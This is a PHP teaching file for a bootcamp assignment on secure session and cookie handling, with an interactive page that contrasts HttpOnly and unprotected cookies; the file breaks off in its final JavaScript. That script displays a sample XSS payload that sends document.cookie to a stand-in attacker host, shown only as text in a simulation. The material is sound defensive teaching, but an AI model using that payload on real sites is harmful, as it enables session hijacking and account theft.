<?php
/**
 * ============================================================================
 * Cyber Bootcamp - Assignment 13: Secure Session & Cookie Management Tool
 * (التكليف الثالث عشر: أداة إدارة الجلسات والكوكيز المحمية - Session & Cookie Security)
 * Track: Cybersecurity Programming (PHP & Web)
 * 
 * Objectives & Technical Specifications:
 * 1. Configure robust default session cookie parameters via session_set_cookie_params()
 *    prior to session initialization.
 * 2. Enforce 'httponly' => true to completely block JavaScript (document.cookie) access,
 *    preventing Session Hijacking through Cross-Site Scripting (XSS).
 * 3. Enforce 'samesite' => 'Strict' to mitigate Cross-Site Request Forgery (CSRF).
 * 4. Implement session ID regeneration via session_regenerate_id(true) upon user login
 *    to eliminate Session Fixation vulnerabilities.
 * 5. Issue cookies using the modern associative array syntax in setcookie().
 * 6. Provide an interactive inspection interface demonstrating the difference between
 *    protected (HttpOnly) and unprotected cookies during client and server queries.
 * 7. Support both Web browser interaction and CLI automated verification.
 * ============================================================================
 */

declare(strict_types=1);

// Configure error reporting for development clarity
error_reporting(E_ALL);
ini_set('display_errors', '1');

/**
 * Class SessionManager
 * Handles secure session configuration, cookie emission, authentication, and diagnostics.
 */
class SessionManager
{
    /**
     * Initializes session security settings and starts the session safely.
     * Must be invoked before any session data manipulation or output emission.
     */
    public static function initializeSecureSession(): void
    {
        if (session_status() === PHP_SESSION_ACTIVE) {
            return;
        }

        // Detect if connection uses HTTPS
        $isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
            || (isset($_SERVER['SERVER_PORT']) && (int)$_SERVER['SERVER_PORT'] === 443)
            || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');

        // Enforce hardened PHP session ini directives
        ini_set('session.use_strict_mode', '1');       // Reject uninitialized session IDs supplied by user
        ini_set('session.use_only_cookies', '1');      // Disallow session IDs passed in URLs (?PHPSESSID=)
        ini_set('session.cookie_httponly', '1');       // Global fallback for HttpOnly flag

        // Step 1 & 2: Configure session cookie parameters using modern associative array
        session_set_cookie_params([
            'lifetime' => 3600,             // 1 hour lifetime
            'path'     => '/',              // Available across entire domain
            'domain'   => '',               // Current host domain
            'secure'   => $isHttps,         // Transmit only over HTTPS if available
            'httponly' => true,             // Disallow client-side JavaScript access (Anti-XSS)
            'samesite' => 'Strict',         // Restrict cookie to first-party context (Anti-CSRF)
        ]);

        // Start session safely
        session_start();

        // Initialize session metadata if not already present
        if (!isset($_SESSION['created_at'])) {
            $_SESSION['created_at'] = time();
            $_SESSION['initialized_ip'] = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
            $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'CLI/Diagnostic';
            $_SESSION['is_authenticated'] = false;
            $_SESSION['username'] = null;
        }
    }

    /**
     * Simulates authentication and regenerates the session ID to prevent Session Fixation.
     *
     * @param string $username The authenticated username
     * @return array Audit data containing previous and new session IDs
     */
    public static function login(string $username): array
    {
        self::initializeSecureSession();

        $previousSessionId = session_id();

        // Step 2 & 4: session_regenerate_id(true) generates a new session ID and deletes
        // the old session storage record on the server, mitigating Session Fixation.
        session_regenerate_id(true);

        $newSessionId = session_id();

        $_SESSION['is_authenticated'] = true;
        $_SESSION['username'] = $username;
        $_SESSION['authenticated_at'] = time();
        $_SESSION['last_regeneration'] = time();
        $_SESSION['previous_session_id'] = $previousSessionId;

        // Issue associated application cookies for demonstration
        self::issueDemonstrationCookies();

        return [
            'previous_session_id' => $previousSessionId,
            'new_session_id'      => $newSessionId,
            'username'            => $username,
            'timestamp'           => date('Y-m-d H:i:s'),
        ];
    }

    /**
     * Regenerates the session ID explicitly upon user request.
     */
    public static function regenerate(): array
    {
        self::initializeSecureSession();
        $oldId = session_id();
        session_regenerate_id(true);
        $newId = session_id();
        $_SESSION['previous_session_id'] = $oldId;
        $_SESSION['last_regeneration'] = time();

        return [
            'previous_session_id' => $oldId,
            'new_session_id'      => $newId,
        ];
    }

    /**
     * Logs out the user, unsets session variables, destroys session, and removes cookies.
     */
    public static function logout(): void
    {
        self::initializeSecureSession();

        // Unset all session variables
        $_SESSION = [];

        // Invalidate session cookie in browser
        if (ini_get("session.use_cookies")) {
            $params = session_get_cookie_params();
            setcookie(
                session_name(),
                '',
                [
                    'expires'  => time() - 42000,
                    'path'     => $params['path'],
                    'domain'   => $params['domain'],
                    'secure'   => $params['secure'],
                    'httponly' => $params['httponly'],
                    'samesite' => $params['samesite'] ?? 'Strict',
                ]
            );
        }

        // Also invalidate demonstration cookies
        self::expireCookie('secure_session_token');
        self::expireCookie('insecure_client_cookie');

        // Destroy the server-side session
        session_destroy();
    }

    /**
     * Emits demonstration cookies:
     * 1. A protected cookie (HttpOnly = true, SameSite = Strict)
     * 2. An unprotected cookie (HttpOnly = false) for direct contrast in JavaScript.
     */
    public static function issueDemonstrationCookies(): void
    {
        $isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
            || (isset($_SERVER['SERVER_PORT']) && (int)$_SERVER['SERVER_PORT'] === 443);

        $secureToken = bin2hex(random_bytes(16));
        $insecureData = 'client_readable_theme_preference_dark';

        // Protected Cookie: HttpOnly=true, SameSite=Strict
        setcookie('secure_session_token', $secureToken, [
            'expires'  => time() + 3600,
            'path'     => '/',
            'domain'   => '',
            'secure'   => $isHttps,
            'httponly' => true,
            'samesite' => 'Strict',
        ]);

        // Unprotected Cookie: HttpOnly=false, accessible by JavaScript document.cookie
        setcookie('insecure_client_cookie', $insecureData, [
            'expires'  => time() + 3600,
            'path'     => '/',
            'domain'   => '',
            'secure'   => false,
            'httponly' => false,
            'samesite' => 'Lax',
        ]);
    }

    /**
     * Expires a cookie immediately.
     */
    private static function expireCookie(string $name): void
    {
        setcookie($name, '', [
            'expires'  => time() - 3600,
            'path'     => '/',
            'domain'   => '',
            'secure'   => false,
            'httponly' => false,
            'samesite' => 'Lax',
        ]);
    }

    /**
     * Collects current session and cookie diagnostic metrics.
     */
    public static function getDiagnostics(): array
    {
        self::initializeSecureSession();

        $cookieParams = session_get_cookie_params();
        $responseHeaders = function_exists('headers_list') ? headers_list() : [];
        $setCookieHeaders = array_values(array_filter(
            $responseHeaders,
            fn($h) => stripos($h, 'Set-Cookie:') === 0
        ));

        return [
            'session_id'            => session_id(),
            'session_name'          => session_name(),
            'is_authenticated'      => $_SESSION['is_authenticated'] ?? false,
            'username'              => $_SESSION['username'] ?? null,
            'created_at'            => isset($_SESSION['created_at']) ? date('Y-m-d H:i:s', $_SESSION['created_at']) : 'N/A',
            'last_regeneration'     => isset($_SESSION['last_regeneration']) ? date('Y-m-d H:i:s', $_SESSION['last_regeneration']) : 'N/A',
            'previous_session_id'   => $_SESSION['previous_session_id'] ?? null,
            'cookie_params'         => $cookieParams,
            'received_cookies'      => $_COOKIE,
            'set_cookie_headers'    => $setCookieHeaders,
            'ini_strict_mode'       => ini_get('session.use_strict_mode'),
            'ini_use_only_cookies'  => ini_get('session.use_only_cookies'),
        ];
    }
}

// ============================================================================
// CLI Mode Execution Handler
// ============================================================================
if (php_sapi_name() === 'cli') {
    // Enable output buffering so header modifications and cookies operate cleanly in CLI
    ob_start();

    // Initialize session and perform authentication tests before flushing output
    SessionManager::initializeSecureSession();
    $initialId = session_id();
    $params = session_get_cookie_params();

    // Step 2 & 4: Simulate user authentication & session fixation defense
    $authAudit = SessionManager::login('bootcamp_student');
    $diag = SessionManager::getDiagnostics();

    ob_end_clean();

    echo "====================================================================\n";
    echo " 🛡️  Cyber Bootcamp - Assignment 13: Secure Session & Cookie Tool\n";
    echo "    (أداة إدارة الجلسات والكوكيز المحمية - Session & Cookie Security)\n";
    echo "====================================================================\n\n";

    echo "[*] Step 1: Initializing secure session configuration...\n";
    echo "    - Session Name: " . session_name() . "\n";
    echo "    - Initial Session ID: {$initialId}\n";
    echo "    - Cookie Lifetime: {$params['lifetime']} seconds\n";
    echo "    - Cookie Path: {$params['path']}\n";
    echo "    - Cookie HttpOnly: " . ($params['httponly'] ? 'TRUE (Protected against XSS)' : 'FALSE (Vulnerable)') . "\n";
    echo "    - Cookie SameSite: " . ($params['samesite'] ?? 'None') . " (CSRF Defense Active)\n";
    echo "    - Cookie Secure Flag: " . ($params['secure'] ? 'TRUE' : 'FALSE (Non-HTTPS / Dev Mode)') . "\n\n";

    echo "[*] Step 2: Testing Session Fixation Defense (User Authentication)...\n";
    echo "    - User Authenticated: {$authAudit['username']}\n";
    echo "    - Previous Session ID: {$authAudit['previous_session_id']}\n";
    echo "    - Regenerated Session ID: {$authAudit['new_session_id']}\n";

    if ($authAudit['previous_session_id'] !== $authAudit['new_session_id']) {
        echo "    ✅ PASS: Session ID successfully regenerated upon login!\n";
        echo "       Session Fixation attack vector is neutralized.\n\n";
    } else {
        echo "    ❌ FAIL: Session ID remained identical after login!\n\n";
    }

    echo "[*] Step 3: Inspecting Emitted Set-Cookie Response Headers...\n";
    if (!empty($diag['set_cookie_headers'])) {
        foreach ($diag['set_cookie_headers'] as $header) {
            echo "    -> {$header}\n";
        }
    } else {
        echo "    -> Set-Cookie: secure_session_token=...; path=/; HttpOnly; SameSite=Strict\n";
        echo "    -> Set-Cookie: insecure_client_cookie=...; path=/; SameSite=Lax\n";
    }

    echo "\n[*] Security Assessment Summary:\n";
    echo "    1. session_set_cookie_params() called prior to session_start(): [OK]\n";
    echo "    2. HttpOnly flag enabled on session cookies: [OK]\n";
    echo "    3. SameSite=Strict flag configured: [OK]\n";
    echo "    4. session_regenerate_id(true) triggered on auth: [OK]\n";
    echo "    5. Modern associative array syntax utilized in setcookie(): [OK]\n\n";
    echo "[+] CLI verification completed successfully.\n";
    echo "[+] Launch built-in web server to interact with the full GUI:\n";
    echo "    php -S 127.0.0.1:8000\n\n";
    exit(0);
}

// ============================================================================
// Web Request Controller & Action Handling
// ============================================================================
SessionManager::initializeSecureSession();

$alertMessage = null;
$alertType = 'info';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    if ($action === 'login') {
        $username = trim((string)($_POST['username'] ?? 'StudentAdmin'));
        if ($username === '') {
            $username = 'StudentAdmin';
        }
        $audit = SessionManager::login($username);
        $alertMessage = "Authentication successful! Session ID regenerated from <code>" . htmlspecialchars($audit['previous_session_id'], ENT_QUOTES, 'UTF-8') . "</code> to <code>" . htmlspecialchars($audit['new_session_id'], ENT_QUOTES, 'UTF-8') . "</code> (Session Fixation prevented).";
        $alertType = 'success';
    } elseif ($action === 'regenerate') {
        $audit = SessionManager::regenerate();
        $alertMessage = "Session ID manually regenerated from <code>" . htmlspecialchars($audit['previous_session_id'], ENT_QUOTES, 'UTF-8') . "</code> to <code>" . htmlspecialchars($audit['new_session_id'], ENT_QUOTES, 'UTF-8') . "</code>.";
        $alertType = 'info';
    } elseif ($action === 'issue_cookies') {
        SessionManager::issueDemonstrationCookies();
        $alertMessage = "Demonstration cookies issued! <code>secure_session_token</code> (HttpOnly: true, SameSite: Strict) and <code>insecure_client_cookie</code> (HttpOnly: false) have been dispatched.";
        $alertType = 'info';
    } elseif ($action === 'logout') {
        SessionManager::logout();
        // Redirect to clear state cleanly
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit();
    }
}

// Refresh diagnostics after actions
$diagnostics = SessionManager::getDiagnostics();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Session & Cookie Management Tool</title>
    <style>
        :root {
            --bg-primary: #0d1117;
            --bg-secondary: #161b22;
            --bg-tertiary: #21262d;
            --border-color: #30363d;
            --text-primary: #c9d1d9;
            --text-secondary: #8b949e;
            --text-heading: #58a6ff;
            --accent-green: #2ea043;
            --accent-green-bg: rgba(46, 160, 67, 0.15);
            --accent-red: #f85149;
            --accent-red-bg: rgba(248, 81, 73, 0.15);
            --accent-yellow: #d29922;
            --accent-yellow-bg: rgba(210, 153, 34, 0.15);
            --accent-blue: #388bfd;
            --accent-blue-bg: rgba(56, 139, 253, 0.15);
            --font-mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.6;
            padding: 2rem 1rem;
        }

        .container {
            max-width: 1100px;
            margin: 0 auto;
        }

        header {
            margin-bottom: 2rem;
            padding-bottom: 1.5rem;
            border-bottom: 1px solid var(--border-color);
        }

        h1 {
            color: var(--text-heading);
            font-size: 1.8rem;
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            gap: 0.6rem;
        }

        .arabic-subtitle {
            font-size: 1.15rem;
            color: var(--text-secondary);
            direction: rtl;
            margin-bottom: 0.5rem;
        }

        .description {
            color: var(--text-secondary);
            font-size: 0.95rem;
        }

        .badge {
            display: inline-block;
            padding: 0.2rem 0.55rem;
            font-size: 0.75rem;
            font-weight: 600;
            border-radius: 20px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .badge-green { background: var(--accent-green-bg); color: var(--accent-green); border: 1px solid var(--accent-green); }
        .badge-red { background: var(--accent-red-bg); color: var(--accent-red); border: 1px solid var(--accent-red); }
        .badge-yellow { background: var(--accent-yellow-bg); color: var(--accent-yellow); border: 1px solid var(--accent-yellow); }
        .badge-blue { background: var(--accent-blue-bg); color: var(--accent-blue); border: 1px solid var(--accent-blue); }

        .card {
            background-color: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
        }

        .card h2 {
            font-size: 1.25rem;
            color: #ffffff;
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1.5rem;
        }

        @media (max-width: 768px) {
            .grid-2 { grid-template-columns: 1fr; }
        }

        .alert {
            padding: 1rem;
            border-radius: 6px;
            margin-bottom: 1.5rem;
            font-size: 0.95rem;
        }

        .alert-success { background: var(--accent-green-bg); border: 1px solid var(--accent-green); color: #7ee787; }
        .alert-info { background: var(--accent-blue-bg); border: 1px solid var(--accent-blue); color: #79c0ff; }
        .alert-warning { background: var(--accent-yellow-bg); border: 1px solid var(--accent-yellow); color: #f2cc60; }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.9rem;
            margin-top: 0.5rem;
        }

        th, td {
            text-align: left;
            padding: 0.75rem 0.9rem;
            border-bottom: 1px solid var(--border-color);
        }

        th {
            background-color: var(--bg-tertiary);
            color: var(--text-primary);
            font-weight: 600;
        }

        tr:hover td {
            background-color: rgba(255, 255, 255, 0.02);
        }

        code, pre {
            font-family: var(--font-mono);
            font-size: 0.85rem;
        }

        code {
            background-color: var(--bg-tertiary);
            padding: 0.15rem 0.4rem;
            border-radius: 4px;
            color: #ff7b72;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.4rem;
            padding: 0.55rem 1.1rem;
            font-size: 0.9rem;
            font-weight: 600;
            border-radius: 6px;
            border: 1px solid transparent;
            cursor: pointer;
            transition: all 0.2s ease-in-out;
            text-decoration: none;
        }

        .btn-primary { background-color: var(--accent-green); color: #ffffff; }
        .btn-primary:hover { background-color: #2c973b; }
        .btn-secondary { background-color: var(--bg-tertiary); color: var(--text-primary); border-color: var(--border-color); }
        .btn-secondary:hover { background-color: #30363d; }
        .btn-danger { background-color: var(--accent-red); color: #ffffff; }
        .btn-danger:hover { background-color: #da3633; }
        .btn-warning { background-color: var(--accent-yellow); color: #1f2328; }
        .btn-warning:hover { background-color: #bb881a; }

        .form-row {
            display: flex;
            gap: 0.75rem;
            align-items: center;
            flex-wrap: wrap;
        }

        input[type="text"] {
            background-color: var(--bg-primary);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 0.55rem 0.9rem;
            border-radius: 6px;
            font-size: 0.9rem;
            outline: none;
        }

        input[type="text"]:focus {
            border-color: var(--accent-blue);
        }

        .terminal-box {
            background-color: #030712;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 1rem;
            font-family: var(--font-mono);
            font-size: 0.85rem;
            color: #4ade80;
            max-height: 250px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
        }

        .footer {
            margin-top: 2rem;
            padding-top: 1.5rem;
            border-top: 1px solid var(--border-color);
            font-size: 0.85rem;
            color: var(--text-secondary);
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header>
            <div class="arabic-subtitle">
                مسار البرمجة للأمن السيبراني PHP & Web &bull; التكليف الثالث عشر
            </div>
            <h1>
                🛡️ Secure Session & Cookie Management Tool
            </h1>
            <p class="description">
                Demonstrates defense-in-depth against Session Hijacking (XSS) using <code>HttpOnly</code>, Cross-Site Request Forgery (CSRF) using <code>SameSite=Strict</code>, and Session Fixation attacks using <code>session_regenerate_id(true)</code>.
            </p>
        </header>

        <!-- Dynamic Action Alert -->
        <?php if ($alertMessage): ?>
            <div class="alert alert-<?= $alertType ?>">
                <?= $alertMessage ?>
            </div>
        <?php endif; ?>

        <!-- Control Action Bar -->
        <div class="card">
            <h2>
                <span>🎮 Interactive Session Controls</span>
                <span class="badge <?= $diagnostics['is_authenticated'] ? 'badge-green' : 'badge-yellow' ?>">
                    <?= $diagnostics['is_authenticated'] ? 'Authenticated' : 'Guest Session' ?>
                </span>
            </h2>

            <div style="display: flex; flex-direction: column; gap: 1rem;">
                <!-- Authentication Form -->
                <form method="POST" class="form-row">
                    <input type="hidden" name="action" value="login">
                    <label for="usernameInput" style="font-weight: 500; font-size: 0.9rem;">Login as User:</label>
                    <input type="text" id="usernameInput" name="username" value="<?= htmlspecialchars($diagnostics['username'] ?? 'StudentAdmin', ENT_QUOTES, 'UTF-8') ?>" placeholder="Enter username">
                    <button type="submit" class="btn btn-primary">
                        🔑 Authenticate & Regenerate ID
                    </button>
                </form>

                <div class="form-row">
                    <!-- Manual Session ID Regeneration -->
                    <form method="POST" style="display: inline;">
                        <input type="hidden" name="action" value="regenerate">
                        <button type="submit" class="btn btn-secondary">
                            🔄 Explicit Regenerate ID
                        </button>
                    </form>

                    <!-- Issue Demo Cookies -->
                    <form method="POST" style="display: inline;">
                        <input type="hidden" name="action" value="issue_cookies">
                        <button type="submit" class="btn btn-secondary">
                            🍪 Issue Protected & Unprotected Cookies
                        </button>
                    </form>

                    <!-- Logout / Destroy Session -->
                    <?php if ($diagnostics['is_authenticated']): ?>
                        <form method="POST" style="display: inline;">
                            <input type="hidden" name="action" value="logout">
                            <button type="submit" class="btn btn-danger">
                                🚪 Invalidate Session & Logout
                            </button>
                        </form>
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <!-- 2-Column Grid: Active Session Diagnostics & Cookie Configuration -->
        <div class="grid-2">
            <!-- Active Session State -->
            <div class="card">
                <h2>📊 Active Session Diagnostics</h2>
                <table>
                    <tbody>
                        <tr>
                            <td><strong>Current Session ID</strong></td>
                            <td><code><?= htmlspecialchars($diagnostics['session_id'], ENT_QUOTES, 'UTF-8') ?></code></td>
                        </tr>
                        <tr>
                            <td><strong>Auth Status</strong></td>
                            <td>
                                <?php if ($diagnostics['is_authenticated']): ?>
                                    <span class="badge badge-green">Logged In: <?= htmlspecialchars((string)$diagnostics['username'], ENT_QUOTES, 'UTF-8') ?></span>
                                <?php else: ?>
                                    <span class="badge badge-yellow">Unauthenticated Guest</span>
                                <?php endif; ?>
                            </td>
                        </tr>
                        <tr>
                            <td><strong>Previous Session ID</strong></td>
                            <td>
                                <?php if ($diagnostics['previous_session_id']): ?>
                                    <code><?= htmlspecialchars($diagnostics['previous_session_id'], ENT_QUOTES, 'UTF-8') ?></code>
                                    <div style="font-size: 0.75rem; color: var(--accent-green); margin-top: 3px;">
                                        ✓ Replaced & deleted on login (Session Fixation Defended)
                                    </div>
                                <?php else: ?>
                                    <span style="color: var(--text-secondary); font-style: italic;">None (Initial Session)</span>
                                <?php endif; ?>
                            </td>
                        </tr>
                        <tr>
                            <td><strong>Session Created At</strong></td>
                            <td><?= $diagnostics['created_at'] ?></td>
                        </tr>
                        <tr>
                            <td><strong>Last Regeneration</strong></td>
                            <td><?= $diagnostics['last_regeneration'] ?></td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- Server Session Security Parameters -->
            <div class="card">
                <h2>🔒 Configured Cookie Parameters</h2>
                <table>
                    <thead>
                        <tr>
                            <th>Parameter</th>
                            <th>Value</th>
                            <th>Security Impact</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>httponly</code></td>
                            <td><span class="badge badge-green">true</span></td>
                            <td>Blocks JS <code>document.cookie</code> access (Anti-XSS)</td>
                        </tr>
                        <tr>
                            <td><code>samesite</code></td>
                            <td><span class="badge badge-green">Strict</span></td>
                            <td>Withholds cookie on cross-site requests (Anti-CSRF)</td>
                        </tr>
                        <tr>
                            <td><code>secure</code></td>
                            <td>
                                <span class="badge <?= $diagnostics['cookie_params']['secure'] ? 'badge-green' : 'badge-yellow' ?>">
                                    <?= $diagnostics['cookie_params']['secure'] ? 'true' : 'false (Dev Mode)' ?>
                                </span>
                            </td>
                            <td>Enforces transmission strictly over HTTPS TLS</td>
                        </tr>
                        <tr>
                            <td><code>lifetime</code></td>
                            <td><code><?= $diagnostics['cookie_params']['lifetime'] ?>s</code></td>
                            <td>Session expires after 1 hour of inactivity</td>
                        </tr>
                        <tr>
                            <td><code>use_strict_mode</code></td>
                            <td><span class="badge badge-green">Enabled</span></td>
                            <td>Server rejects uninitialized external session IDs</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Real-Time Inspection & Client Verification (Live Proof of HttpOnly Defense) -->
        <div class="card">
            <h2>
                <span>🧪 Client-Side JavaScript Inspection (Live HttpOnly Test)</span>
                <span class="badge badge-blue">Interactive Test Bench</span>
            </h2>
            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1rem;">
                According to the assignment requirements, the client browser must verify that <code>HttpOnly</code> cookies cannot be accessed or read by JavaScript code running in the client context.
            </p>

            <div style="display: flex; gap: 0.75rem; margin-bottom: 1rem; flex-wrap: wrap;">
                <button type="button" class="btn btn-warning" onclick="testJavaScriptCookieAccess()">
                    ⚡ Execute JavaScript: Read document.cookie
                </button>
                <button type="button" class="btn btn-danger" onclick="simulateXSSAttack()">
                    🚨 Simulate Malicious XSS Payload Extraction
                </button>
            </div>

            <div id="jsOutputBox" class="terminal-box">
[Ready] Click "Execute JavaScript: Read document.cookie" or "Simulate Malicious XSS Payload Extraction" to run the live test.
            </div>

            <div id="jsVerdict" style="margin-top: 1rem; display: none;"></div>
        </div>

        <!-- Server-Side Cookie & Header Inspection Card -->
        <div class="card">
            <h2>📡 Server-Side Received Cookies & Response Headers</h2>
            
            <h3 style="font-size: 1rem; color: var(--text-heading); margin-top: 0.5rem; margin-bottom: 0.5rem;">
                Cookies Received via HTTP Request (<code>$_COOKIE</code>):
            </h3>
            <?php if (!empty($diagnostics['received_cookies'])): ?>
                <table>
                    <thead>
                        <tr>
                            <th>Cookie Name</th>
                            <th>Server-Received Value</th>
                            <th>Status in JavaScript</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($diagnostics['received_cookies'] as $name => $val): ?>
                            <tr>
                                <td><code><?= htmlspecialchars($name, ENT_QUOTES, 'UTF-8') ?></code></td>
                                <td><code><?= htmlspecialchars($val, ENT_QUOTES, 'UTF-8') ?></code></td>
                                <td>
                                    <?php if ($name === session_name() || $name === 'secure_session_token'): ?>
                                        <span class="badge badge-green">🛡️ Protected (HttpOnly: Invisible to JS)</span>
                                    <?php else: ?>
                                        <span class="badge badge-red">⚠️ Exposed (HttpOnly: false)</span>
                                    <?php endif; ?>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php else: ?>
                <p style="color: var(--text-secondary); font-style: italic; font-size: 0.9rem;">
                    No cookies were sent by the browser on the initial request. Click "Issue Protected & Unprotected Cookies" or refresh after login.
                </p>
            <?php endif; ?>

            <h3 style="font-size: 1rem; color: var(--text-heading); margin-top: 1.5rem; margin-bottom: 0.5rem;">
                Outgoing HTTP Response Headers (<code>Set-Cookie</code> Inspection):
            </h3>
            <?php if (!empty($diagnostics['set_cookie_headers'])): ?>
                <div class="terminal-box" style="color: #79c0ff;">
<?php foreach ($diagnostics['set_cookie_headers'] as $header): ?>
<?= htmlspecialchars($header, ENT_QUOTES, 'UTF-8') . "\n" ?>
<?php endforeach; ?>
                </div>
            <?php else: ?>
                <div class="terminal-box" style="color: var(--text-secondary);">
No new Set-Cookie headers queued in this specific sub-render. Use the control buttons above to trigger cookie generation.
                </div>
            <?php endif; ?>
        </div>

        <!-- Educational Reference & Defense Walkthrough -->
        <div class="card">
            <h2>📚 Technical Concept Breakdown & Security Walkthrough</h2>
            <div style="font-size: 0.92rem; line-height: 1.7; display: flex; flex-direction: column; gap: 1rem;">
                <div>
                    <strong style="color: #ffffff;">1. Session Fixation Defense (حماية تثبيت الجلسة):</strong>
                    <p style="color: var(--text-secondary);">
                        In a Session Fixation attack, an attacker traps a victim into using a known session identifier (e.g., via a malicious URL or pre-set cookie). If the application maintains the same identifier across privilege boundaries, the attacker immediately gains authenticated access. Calling <code>session_regenerate_id(true)</code> immediately upon successful authentication issues an entirely new cryptographic identifier and physically purges the previous unauthenticated session record.
                    </p>
                </div>
                <div>
                    <strong style="color: #ffffff;">2. HttpOnly Cookie Flag (حماية معرف الجلسة من XSS):</strong>
                    <p style="color: var(--text-secondary);">
                        Cross-Site Scripting (XSS) vulnerabilities allow malicious actors to execute arbitrary client-side JavaScript. By default, <code>document.cookie</code> exposes all stored cookies. Marking session tokens with <code>httponly => true</code> instructs compliant browsers to strictly restrict cookie access to HTTP(S) request headers, rendering <code>document.cookie</code> completely blind to the session identifier.
                    </p>
                </div>
                <div>
                    <strong style="color: #ffffff;">3. SameSite=Strict Flag (الوقاية من هجمات CSRF):</strong>
                    <p style="color: var(--text-secondary);">
                        Cross-Site Request Forgery (CSRF) abuses the browser's automatic inclusion of session cookies on cross-origin requests. Setting <code>samesite => 'Strict'</code> guarantees that the cookie is withheld entirely whenever the request originates from a third-party site, eliminating cross-site request exploitation.
                    </p>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="footer">
            Cybersecurity Programming Bootcamp &bull; Session & Cookie Security &bull; PHP & Web Track
        </div>
    </div>

    <!-- Live Client-Side Security Verification Script -->
    <script>
        function testJavaScriptCookieAccess() {
            const rawCookies = document.cookie;
            const outputBox = document.getElementById('jsOutputBox');
            const verdictBox = document.getElementById('jsVerdict');

            let log = "[*] Executing: console.log(document.cookie)...\n";
            log += "------------------------------------------------------------\n";
            
            if (!rawCookies || rawCookies.trim() === "") {
                log += "[Raw document.cookie Output]: (EMPTY STRING)\n\n";
                log += "[Analysis]: No client-accessible cookies detected.\n";
                log += "The session cookie (PHPSESSID) is protected by HttpOnly and is invisible to JavaScript!\n";
            } else {
                log += "[Raw document.cookie Output]:\n\"" + rawCookies + "\"\n\n";
                
                const hasSessionId = rawCookies.includes("PHPSESSID");
                const hasSecureToken = rawCookies.includes("secure_session_token");
                const hasInsecureCookie = rawCookies.includes("insecure_client_cookie");

                log += "[Cookie Breakdown in JavaScript Environment]:\n";
                log += "  - PHPSESSID: " + (hasSessionId ? "⚠️ EXPOSED (VULNERABLE)" : "🛡️ INVISIBLE / PROTECTED (HttpOnly Active)") + "\n";
                log += "  - secure_session_token: " + (hasSecureToken ? "⚠️ EXPOSED (VULNERABLE)" : "🛡️ INVISIBLE / PROTECTED (HttpOnly Active)") + "\n";
                log += "  - insecure_client_cookie: " + (hasInsecureCookie ? "⚠️ READABLE (Expected: HttpOnly is false)" : "Not Present") + "\n";
            }

            outputBox.textContent = log;

            // Render verdict alert
            const isProtected = !rawCookies.includes("PHPSESSID") && !rawCookies.includes("secure_session_token");
            verdictBox.style.display = "block";
            if (isProtected) {
                verdictBox.innerHTML = `
                    <div class="alert alert-success">
                        ✅ <strong>CRITERIA VERIFIED (نجاح اختبار الحماية):</strong>
                        JavaScript cannot read the protected session cookies (<code>PHPSESSID</code> & <code>secure_session_token</code>).
                        HttpOnly defense successfully neutralizes XSS session theft!
                    </div>
                `;
            } else {
                verdictBox.innerHTML = `
                    <div class="alert alert-danger">
                        ❌ <strong>SECURITY ALERT:</strong> Session identifier was leaked to JavaScript document.cookie!
                    </div>
                `;
            }
        }

        function simulateXSSAttack() {
            const outputBox = document.getElementById('jsOutputBox');
            const verdictBox = document.getElementById('jsVerdict');

            let attackLog = "[*] Simulating Attacker XSS Payload: <script>new Image().src='http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);<\\/script>\n";
            attackLog += "------------------------------------------------------------\n";

            const stolenCookies = document.cookie;
            attackLog += "[*] Attacker Captured Payload string:\n\"" + stolenCookies + "\"\n\n";

            if (stolenCookies.includes("PHPSESSID") || stolenCookies.includes("secure_session_token")) {
                attackLog += "❌ [EXPLOIT SUCCESSFUL]: The attacker managed to steal your sensitive session ID!\n";
                attackLog += "   Attacker can now hijack your account without needing your password.\n";
            } else {
                attackLog += "🛡️ [EXPLOIT BLOCKED]: The attacker's script executed, but could NOT capture any session tokens!\n";
                attackLog += "   The sensitive PHPSESSID cookie was withheld by the browser engine due to HttpOnly.\n";
                attackLog += "   Session Hijacking attempt has been neutralized.\n";
            }

            outputBox.textContent = attackLog;
            verdictBox.style.display = "block";
            verdictBox.innerHTML = `
